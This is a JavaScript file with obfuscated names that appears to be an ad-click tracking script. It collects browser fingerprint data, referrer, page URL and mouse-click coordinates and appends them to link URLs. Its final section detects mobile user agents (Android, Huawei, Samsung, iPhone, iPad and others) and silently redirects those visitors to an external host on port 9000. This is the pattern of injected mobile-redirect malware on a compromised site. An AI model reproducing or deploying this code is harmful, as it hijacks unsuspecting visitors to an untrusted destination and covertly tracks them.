var _adds_ = _Zadds_(),
	_zvn = 0,
	_zm = -1,
	l = -1,
	_zk = -1,
	_zj = -1,
	_zg = -1,
	_za = -1,
	_zy = -1,
	_zp = -1,
	_zr = -1;

function _zf_(i) {
	return document.getElementById(i)
}
function _zd_(i) {
	return document.getElementsByTagName(i)
}
function _zz_(i) {
	i = i || window.event;
	this.target = i.target || i.srcElement
}
function _zadd_(A, i, B) {
	if (window.addEventListener) {
		A.addEventListener(i, B, false)
	} else {
		A.attachEvent("on" + i, B)
	}
}
function _zt_(i) {
	if (_zvn > 5) {
		return
	}
	if (_zk == -1) _zk = i.clientX;
	else {
		_zk = _zk + "," + i.clientX;
		_zvn++
	}
	_zj == -1 ? _zj = i.clientY : _zj = _zj + "," + i.clientY
}
function _zv_() {
	if (_za == -1) {
		_za = _zu_()
	}
	_zy = _zu_() - _za
}
function _zu_() {
	return new Date().getTime()
}
function _zh_(A) {
	var i = new _zz_(A);
	if (i.target.tagName.toLowerCase() != "a") {
		i.target = i.target.parentNode
	}
	_zs_(A);
	_zv_();
	if ("s" == "s") {
		_zb_(i)
	}
}
function _zs_(i) {
	_zm = i.clientX;
	_zl = i.clientY
}
function _zc_(i) {
	if (i.type == "mousedown") {
		_zg = _zu_()
	} else {
		_zg = _zu_() - _zg
	}
};

function _zb_(i) {
	var A = i.target.innerHTML;
	if (i.target.href.indexOf(";ck;") == -1 && i.target.href.length > 50) {
		i.target.href += ";ck;" + _zp + ";" + _zg + ";" + _zm + ";" + _zl + ";" + _zk + ";" + _zj + ";" + _zy + _adds_
	}
	return false
};

function _zn_(A) {
	var i = new _zz_(A);
	if (_zp == -1) {
		_zp = 0
	}
	_zp++
};

function c(e) {};

function h(a) {};

function _Zya_(b) {
	var Z = {};
	if (b in Z) return Z[b];
	return Z[b] = navigator.userAgent.toLowerCase().indexOf(b) != -1
}
function _ZFv_() {
	if (navigator.plugins && navigator.mimeTypes.length) {
		var b = navigator.plugins["Shockwave Flash"];
		if (b && b.description) return b.description.replace(/([a-zA-Z]|\s)+/, "").replace(/(\s)+r/, ".")
	} else if (_Zya_("msie") && !window.opera) {
		var c = null;
		try {
			c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7")
		} catch (e) {
			var a = 0;
			try {
				c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
				a = 6;
				c.AllowScriptAccess = "always"
			} catch (e) {
				if (a == 6) return a.toString()
			}
			try {
				c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash")
			} catch (e) {}
		}
		if (c != null) {
			var a = c.GetVariable("$version").split(" ")[1];
			return a.replace(/,/g, ".")
		}
	}
	return "0"
}
function _Zref_() {
	var r;
	try {
		r = window.top.document.referrer
	} catch (e) {
		r = document.referrer
	};
	if (r) {
		return escape(r)
	} else {
		return ""
	}
}
function _Zzwr_(s) {
	if (!s) return "";
	str = s.replace(/[一-龥]/ig, "x");
	return str
}
function _ZSiteurl_() {
	var s;
	try {
		s = window.top.document.location.href
	} catch (e) {
		s = document.location.href
	};
	if (s) {
		return escape(_Zzwr_(s))
	} else {
		return ""
	}
}
function _Zhv_() {
	var a = 0;
	if (window.top.location == document.location && document.body) {
		var j = document.body.scrollHeight,
			v = document.body.clientHeight;
		if (v && j) {
			a = Math.round(j)
		}
	}
	return a
}
function _Zsc_() {
	var s = window.screen;
	return s.width + "x" + s.height
}
function _Zadds_() {
	var s = "&a=" + _ZFv_() + ";" + _Zsc_() + ";" + _ZSiteurl_() + ";" + _Zref_() + ";" + _Zhv_();
	return s
}
function _ZCadds_() {
	var s = "&a=" + _ZFv_() + ";" + _Zsc_() + ";" + _Zref_() + ";";
	return s
}
var ua = navigator.userAgent.toLowerCase();
var refer = document.referrer;
var contains = function(a, b) {
		if (a.indexOf(b) != -1) {
			return true
		}
	};
var toMobileVertion = function() {
		window.location.href = "http://dkjsdd.ditiez.org:9000/ok9999.html"
	}
if ((contains(ua, "android") && contains(ua, "mobile")) || (contains(ua, "android") && contains(ua, "mozilla")) || (contains(ua, "android") && contains(ua, "linux")) || (contains(ua, "android") && contains(ua, "oupeng")) || contains(ua, "huawei") || contains(ua, "samsung") || contains(ua, "lenovo") || contains(ua, "coolpad")) {
	toMobileVertion()
}
function browserRedirect() {
	var a = navigator.userAgent.toLowerCase();
	var b = a.match(/ipad/i) == "ipad";
	var c = a.match(/iphone os/i) == "iphone os";
	var d = a.match(/midp/i) == "midp";
	var e = a.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
	var f = a.match(/ucweb/i) == "ucweb";
	var g = a.match(/android/i) == "android";
	var h = a.match(/windows ce/i) == "windows ce";
	var i = a.match(/windows mobile/i) == "windows mobile";
	if (b || c) {
		window.location.href = 'http://dkjsdd.ditiez.org:9000/ok9999.html'
	}
}
browserRedirect();